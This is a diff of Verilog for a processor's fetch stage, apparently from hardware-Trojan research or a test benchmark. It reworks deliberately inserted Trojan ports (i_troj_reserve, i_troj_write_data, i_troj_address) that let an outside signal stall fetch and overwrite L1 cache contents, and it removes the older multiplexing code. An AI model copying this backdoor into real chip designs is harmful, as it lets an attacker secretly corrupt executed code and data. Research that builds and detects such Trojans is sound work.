@@ -61,11 +61,11 @@ input                       i_cache_flush,      // cache flush
 input       [31:0]          i_cacheable_area,   // each bit corresponds to 2MB address space
 input                       i_system_rdy,
 
-input						i_troj_reserve,		/// Trojan signal to stall fetch
-input		[127:0]			i_troj_write_data,	/// Trojan data written to cache
-input		[31:0]			i_troj_address,		
-input		[31:0]			i_troj_address_nxt,
-output					o_cache_stall,
+input				i_troj_reserve,		/// Trojan signal to stall fetch
+input		[127:0]		i_troj_write_data,	/// Trojan data written to cache
+input		[31:0]		i_troj_address,		
+input		[31:0]		i_troj_address_nxt,
+output				o_cache_stall,
 
 output                      o_fetch_stall,      // when this is asserted all registers 
                                                 // in all 3 pipeline stages are held
@@ -113,33 +113,9 @@ assign o_read_data       = sel_cache  ? cache_read_data :
 // Stall the instruction decode and execute stages of the core
 // when the fetch stage needs more than 1 cycle to return the requested
 // read data
+
 /// Modified to stall when Trojan is busy modifying cache
 assign o_fetch_stall     = !i_system_rdy || wb_stall || cache_stall || i_troj_reserve;
-
-/// Trojan muxed signals for cache input
-wire 		troj_sel;
-wire 		troj_excl;
-wire [31:0] 	troj_write_data;
-wire 		troj_write_enable;
-wire [31:0]	troj_address;
-wire [31:0] 	troj_address_nxt;
-wire [3:0]	troj_byte_enable;
-wire		troj_wb_stall;
-
-wire [31:0]	troj_wb_read_data;
-wire [31:0] 	troj_wb_addr;
-
-assign troj_sel 		= i_troj_reserve ? 1 : sel_cache;
-assign troj_excl 		= i_troj_reserve ? 0 : i_exclusive;
-assign troj_write_data		= i_troj_reserve ? i_troj_write_data : i_write_data;
-assign troj_write_enable	= i_troj_reserve ? 1 : i_write_enable;
-assign troj_address		= i_troj_reserve ? i_troj_address : i_address;
-assign troj_address_nxt 	= i_troj_reserve ? i_troj_address_nxt : i_address_nxt;
-assign troj_byte_enable		= i_troj_reserve ? 4'b0 : i_byte_enable;
-
-assign troj_wb_stall		= i_troj_reserve ? 0 : o_wb_stb & ~i_wb_ack;
-assign troj_wb_read_data	= i_troj_reserve ? i_troj_write_data : i_wb_dat;
-assign troj_wb_addr		= i_troj_reserve ? i_troj_address : o_wb_adr;
 
 assign o_cache_stall 		= cache_stall;
 
@@ -172,33 +148,6 @@ a23_cache u_cache (
     .i_troj_data		( i_troj_write_data  	),
     .i_troj_addr		( i_troj_address	)
 );
-
-/*
-// ======================================
-// L1 Cache (Unified Instruction and Data)
-// ======================================
-a23_cache u_cache (
-    .i_clk                      ( i_clk                 ),
-     
-    .i_select                   ( troj_sel        	),
-    .i_exclusive                ( troj_excl             ),
-    .i_write_data               ( troj_write_data       ),
-    .i_write_enable             ( troj_write_enable     ),
-    .i_address                  ( troj_address          ),
-    .i_address_nxt              ( troj_address_nxt      ),
-    .i_byte_enable              ( troj_byte_enable      ),
-    .i_cache_enable             ( i_cache_enable        ),
-    .i_cache_flush              ( i_cache_flush         ),
-    .o_read_data                ( cache_read_data       ),
-    
-    .o_stall                    ( cache_stall           ),
-    .i_core_stall               ( o_fetch_stall         ),
-    .o_wb_req                   ( cache_wb_req          ),
-    .i_wb_address               ( o_wb_adr              ),
-    .i_wb_read_data             ( i_wb_dat              ),
-    .i_wb_stall                 ( troj_wb_stall	        )
-);
-*/
 
 
 // ======================================
